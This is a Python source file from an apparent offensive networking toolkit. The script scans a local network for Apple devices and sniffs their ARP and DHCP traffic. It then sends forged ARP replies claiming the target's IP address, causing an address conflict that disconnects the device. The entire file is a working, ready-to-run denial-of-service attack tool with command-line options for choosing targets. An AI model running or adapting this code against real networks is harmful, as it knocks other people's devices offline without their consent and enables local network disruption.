#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
apple_arp_dos.py: Disconnect Apple devices in local network with ARP packets
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from typing import Union, List, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Set global variables
network_interface_settings: Union[None, Dict[str, str]] = None
apple_device: Union[None, List[str]] = list()
raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
# endregion


# region ARP request sender
def _send_arp_requests(source_mac_address: str, send_socket: socket,
                       random_ip_address: str, count_of_packets: int = 5) -> None:
    arp_init_request = arp.make_request(ethernet_src_mac=source_mac_address,
                                        ethernet_dst_mac='33:33:00:00:00:01',
                                        sender_mac=source_mac_address,
                                        sender_ip=apple_device[0],
                                        target_mac='00:00:00:00:00:00',
                                        target_ip=random_ip_address)
    for _ in range(count_of_packets):
        send_socket.send(arp_init_request)
        sleep(0.5)
# endregion


# region ARP reply sender
def _send_arp_reply(source_mac_address: str, send_socket: socket) -> None:
    arp_reply = arp.make_response(ethernet_src_mac=source_mac_address,
                                  ethernet_dst_mac=apple_device[1],
                                  sender_mac=source_mac_address,
                                  sender_ip=apple_device[0],
                                  target_mac=apple_device[1],
                                  target_ip=apple_device[0])
    send_socket.send(arp_reply)
    base.print_info('ARP response to: ', apple_device[1], ' "' + apple_device[0] + ' is at ' + source_mac_address + '"')
# endregion


# region Analyze request
def _analyze(request: Dict) -> None:

    # region Define global variables
    global network_interface_settings
    global apple_device
    global raw_socket
    # endregion

    # region ARP request
    if 'ARP' in request.keys():
        if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                request['ARP']['target-mac'] == '00:00:00:00:00:00' and \
                request['ARP']['target-ip'] == apple_device[0]:
            base.print_info('ARP request from: ', request['Ethernet']['source'],
                            ' "Who has ' + request['ARP']['target-ip'] +
                            '? Tell ' + request['ARP']['sender-ip'] + '"')
            _send_arp_reply(source_mac_address=network_interface_settings['MAC address'],
                            send_socket=raw_socket)
    # endregion

    # region DHCPv4 request
    else:
        if 'DHCPv4' in request.keys():
            if request['DHCPv4'][53] == 4:
                base.print_success('DHCPv4 Decline from: ', request['Ethernet']['source'],
                                   ' IPv4 address conflict detection!')
            if request['DHCPv4'][53] == 3:
                if 50 in request['DHCPv4'].keys():
                    apple_device[0] = str(request['DHCPv4'][50])
                    base.print_success('DHCPv4 Request from: ', apple_device[1], ' requested ip: ', apple_device[0])
    # endregion
# endregion


# region Sniff ARP and DHCP request from target
def _sniffer() -> None:
    sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'],  prn=_analyze,
                filters={'Ethernet': {'source': apple_device[1]},
                         'ARP': {'opcode': 1},
                         'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
                         'UDP': {'source-port': 68, 'destination-port': 67}})
# endregion


# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.base import Base
    from raw_packet.Scanners.scanner import Scanner
    from raw_packet.Scanners.arp_scanner import ArpScan
    from raw_packet.Utils.network import RawARP, RawSniff
    from raw_packet.Utils.tm import ThreadManager
    # endregion

    # region Init Raw-packet classes
    base: Base = Base()
    scanner: Scanner = Scanner()
    sniff: RawSniff = RawSniff()
    arp_scan: ArpScan = ArpScan()
    arp: RawARP = RawARP()
    # endregion

    # region Check user and platform
    base.check_user()
    base.check_platform()
    # endregion

    try:
        # region Parse script arguments
        parser = ArgumentParser(description='Disconnect Apple device in local network with ARP packets')
        parser.add_argument('-i', '--interface', type=str, help='Set interface name for send ARP packets', default=None)
        parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
        parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
        parser.add_argument('-n', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection',
                            default=False)
        parser.add_argument('-q', '--quit', action='store_true', help='Minimal output',
                            default=False)
        args = parser.parse_args()
        # endregion

        # region Print banner
        if not args.quit:
            base.print_banner()
        # endregion

        # region Get listen network interface, your IP and MAC address, first and last IP in local network
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ARP and DHCP requests ...')
        listen_network_interface: str = base.network_interface_selection(args.interface)
        network_interface_settings = base.get_interface_settings(interface_name=listen_network_interface)
        your_mac_address: Union[None, str] = network_interface_settings['MAC address']
        your_ip_address: Union[None, str] = network_interface_settings['IPv4 address']
        first_ip_address: Union[None, str] = network_interface_settings['First IPv4 address']
        last_ip_address: Union[None, str] = network_interface_settings['Last IPv4 address']
        assert your_mac_address is not None, \
            'Network interface: ' + base.error_text(str(listen_network_interface)) + \
            ' has not MAC address!'
        assert your_ip_address is not None, \
            'Network interface: ' + base.error_text(str(listen_network_interface)) + \
            ' has not IPv4 address!'
        assert first_ip_address is not None, \
            'Network interface: ' + base.error_text(str(listen_network_interface)) + \
            ' has not IPv4 address or network mask!'
        assert last_ip_address is not None, \
            'Network interface: ' + base.error_text(str(listen_network_interface)) + \
            ' has not IPv4 address or network mask!'
        # endregion

        # region Create global raw socket
        raw_socket.bind((listen_network_interface, 0))
        # endregion

        # region General output
        if not args.quit:
            base.print_info('Listen network interface: ', listen_network_interface)
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('Your MAC address: ', your_mac_address)
            base.print_info('First ip address: ', first_ip_address)
            base.print_info('Last ip address: ', last_ip_address)
        # endregion

        # region Check target IP and new IP addresses
        if args.target_ip is not None:
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
                '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            if args.target_mac is None:
                base.print_info('Find MAC address of Apple device with IP address: ', args.target_ip, ' ...')
                target_mac = arp_scan.get_mac_address(network_interface=listen_network_interface,
                                                      target_ip_address=args.target_ip,
                                                      exit_on_failure=True,
                                                      show_scan_percentage=False)
            else:
                assert base.mac_address_validation(args.target_mac), \
                    'Bad MAC address `-m, --target_mac`: ' + base.error_text(args.target_mac) + \
                    '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
                target_mac = args.target_mac
            apple_device = [args.target_ip, target_mac, 'Apple, Inc.']
        # endregion

        # region Find Apple devices in local network with arp or nmap scan
        else:
            if not args.nmap_scan:
                base.print_info('Find Apple devices in local network with ARP scan ...')
                apple_devices: List[List[str]] = scanner.find_apple_devices_by_mac(listen_network_interface)
            else:
                base.print_info('Find Apple devices in local network with nmap scan ...')
                apple_devices: List[List[str]] = scanner.find_apple_devices_with_nmap(listen_network_interface)
            apple_device = scanner.apple_device_selection(apple_devices=apple_devices, exit_on_failure=True)
        # endregion

        # region Print target IP and MAC address
        if not args.quit:
            base.print_info('Target: ', apple_device[0] + ' (' + apple_device[1] + ')')
        # endregion

        # region Start _sniffer
        tm = ThreadManager(2)
        tm.add_task(_sniffer)
        # endregion

        # region Send first Multicast ARP request packets
        sleep(3)
        if not args.quit:
            base.print_warning('Send initial Multicast ARP requests')
        _send_arp_requests(source_mac_address=your_mac_address, send_socket=raw_socket,
                           random_ip_address=base.get_random_ip_on_interface(listen_network_interface),
                           count_of_packets=5)
        # endregion

        # region Wait for completion
        tm.wait_for_completion()
        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)

# endregion
